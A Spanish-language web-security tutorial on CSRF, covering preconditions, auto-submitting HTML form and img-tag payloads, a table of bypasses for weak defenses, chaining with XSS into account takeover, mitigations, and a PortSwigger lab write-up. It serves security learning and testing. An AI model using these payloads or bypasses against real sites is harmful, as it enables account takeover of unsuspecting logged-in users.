# CSRF (Cross-Site Request Forgery)

**CSRF** obliga al navegador de una víctima **autenticada** a ejecutar una acción no deseada en una web donde tiene sesión (cambiar su email, su contraseña, transferir dinero). El servidor no distingue si la petición la inició el usuario o una página maliciosa, porque el navegador adjunta las cookies automáticamente.

---

## Requisitos para que exista CSRF

1. La acción usa **cookies de sesión** que el navegador envía solas.
2. La petición es **predecible** (no hay un token anti-CSRF secreto).
3. No hay otra protección (p.ej. `SameSite`, revalidación de contraseña).

---

## Cómo se ve y se explota

Imagina un cambio de email vía POST sin token:

```http
POST /account/email HTTP/1.1
Host: victima.com
Cookie: session=...

email=nuevo@atacante.com
```

Una página maliciosa que la víctima visite estando logueada dispara esa petición:

```html
<!-- Auto-envío al cargar la página -->
<form action="https://victima.com/account/email" method="POST" id="x">
  <input type="hidden" name="email" value="atacante@evil.com">
</form>
<script>document.getElementById('x').submit();</script>
```

Si la acción es GET (mala práctica), basta una imagen:

```html
<img src="https://victima.com/account/delete?id=1">
```

> **Consejo:** para confirmar CSRF, coge la petición en Burp y usa **Engagement tools → Generate CSRF PoC** (Burp Pro), o monta el formulario a mano. Si la acción se ejecuta sin token → vulnerable.

---

## Bypass de defensas débiles

| Defensa | Bypass si... |
| ------- | ------------ |
| Token anti-CSRF | ...el token no se valida, se puede omitir, o se acepta el de otra sesión. |
| Validación por método | ...cambias POST↔GET y la acción sigue funcionando. |
| Comprobación de `Referer` | ...falta el Referer (no se valida ausencia) o se valida con un `includes` débil. |
| `SameSite=Lax` | ...la acción usa GET (Lax permite navegación GET top-level). |
| Token en cookie (double submit) | ...puedes fijar/leer esa cookie (subdominios, XSS). |

---

## CSRF + XSS = toma de cuenta

Un CSRF que cambia el email de la víctima permite luego **recuperar su contraseña** y tomar la cuenta. Encadenado con [XSS](./XSS.md), el XSS roba el token anti-CSRF y ejecuta la acción incluso con protección.

---

## Mitigación (para el informe)

- Tokens anti-CSRF **únicos por sesión** y validados en el servidor.
- Cookies con `SameSite=Strict`/`Lax`.
- Revalidar acciones sensibles (pedir la contraseña actual).

---

## Herramientas relacionadas

| Herramienta | Descripción |
| ----------- | ----------- |
| `Burp Suite` | Detectar ausencia de token y generar PoC. |
| PortSwigger Web Security Academy | Labs de CSRF por tipo de defensa. |

---

> **Consejo:** busca CSRF en las acciones **con impacto**: cambio de email/contraseña, creación de usuarios admin, transferencias. Si no hay token (o no se valida), tienes toma de cuenta. Y recuerda la regla: una acción que cambia estado **nunca** debería poder hacerse por GET.

---

## Dónde practicar el CSRF

| Recurso | Tipo | Enlace |
| ------- | ---- | ------ |
| PortSwigger Academy — CSRF | Labs gratis | https://portswigger.net/web-security/csrf |
| DVWA — CSRF | Descargable (Docker) | https://github.com/digininja/DVWA |
| OWASP Juice Shop | Descargable (Docker) | https://github.com/juice-shop/juice-shop |

## Writeup guiado: CSRF sin defensas (PortSwigger)

Lab: *"CSRF vulnerability with no defenses"*. Objetivo: cambiar el email de la víctima desde una página maliciosa.

```flow
Analizar :: La petición de cambio de email no lleva token anti-CSRF.
Construir :: Un formulario HTML que auto-envíe esa petición.
Alojar :: Subirlo al exploit server de PortSwigger.
Entregar :: La víctima lo visita (logueada) y su email cambia.
```

### Paso 1 — Analizar la petición

```http
POST /my-account/change-email HTTP/1.1
Cookie: session=...

email=test@test.com
```

No hay token CSRF ni `SameSite` estricto → vulnerable.

### Paso 2 — Construir el PoC

```html
<form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="atacante@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

### Paso 3 — Entregar

Súbelo al **exploit server** y pulsa *Deliver to victim*. El email de la víctima cambia → lab resuelto. En Burp Pro, *Engagement tools → Generate CSRF PoC* crea el formulario por ti.

> **Consejo:** sube de nivel con los labs de PortSwigger que añaden defensas (token que no se valida, bypass por método, `SameSite=Lax` con GET). Aprender a **saltarse** las defensas débiles es lo que convierte un CSRF "teórico" en una toma de cuenta real.
